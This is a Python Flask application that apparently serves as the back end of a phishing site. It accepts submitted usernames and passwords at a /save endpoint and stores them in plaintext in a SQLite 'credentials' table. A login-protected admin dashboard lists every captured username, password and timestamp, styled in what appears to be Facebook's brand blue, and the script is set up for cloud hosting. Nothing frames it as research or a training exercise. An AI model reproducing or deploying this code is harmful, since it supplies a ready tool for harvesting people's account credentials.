from flask import Flask, request, render_template, render_template_string, redirect, session
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = "SUPER_SECRET_KEY"  # Change this

DB_FILE = "credentials.db"
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "password123"  # Change this

# Initialize database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

# Save credentials
def save_credentials(username, password):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO credentials (username, password, timestamp) VALUES (?, ?, ?)",
              (username, password, timestamp))
    conn.commit()
    conn.close()

# Serve index.html
@app.route('/')
def home():
    return render_template('index.html')

# Save credentials
@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')

        if not username or not password:
            return {"status": "error", "message": "Missing username or password"}, 400

        save_credentials(username, password)
        return {"status": "success", "message": "Credentials saved"}, 200
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

# Admin panel
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if 'logged_in' in session and session['logged_in']:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, username, password, timestamp FROM credentials ORDER BY id DESC")
        rows = c.fetchall()
        conn.close()
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; }
                h1 { color: #333; }
                table { border-collapse: collapse; width: 100%; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
                th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; }
                th { background: #1877f2; color: white; }
                tr:hover { background-color: #f1f1f1; }
                a.logout { display: inline-block; margin-bottom: 15px; padding: 8px 16px; background: #f44336; color: #fff; text-decoration: none; border-radius: 4px; }
                a.logout:hover { background: #d32f2f; }
            </style>
        </head>
        <body>
        <h1>Admin Dashboard</h1>
        <a href="/admin/logout" class="logout">Logout</a>
        <table>
        <tr><th>ID</th><th>Username</th><th>Password</th><th>Timestamp</th></tr>
        {% for row in rows %}
        <tr>
            <td>{{ row[0] }}</td>
            <td>{{ row[1] }}</td>
            <td>{{ row[2] }}</td>
            <td>{{ row[3] }}</td>
        </tr>
        {% endfor %}
        </table>
        </body>
        </html>
        ''', rows=rows)

    # Admin login
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect('/admin')
        else:
            return "<h3>Login failed. <a href='/admin'>Try again</a></h3>"

    return '''
    <h2>Admin Login</h2>
    <form method="post">
        Username: <input type="text" name="username" required><br><br>
        Password: <input type="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>
    '''

@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    return "<h3>Logged out. <a href='/admin'>Login again</a></h3>"

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 5000))  # Render assigns this
    print(f"[*] Server running on port {port}")
    app.run(host='0.0.0.0', port=port)
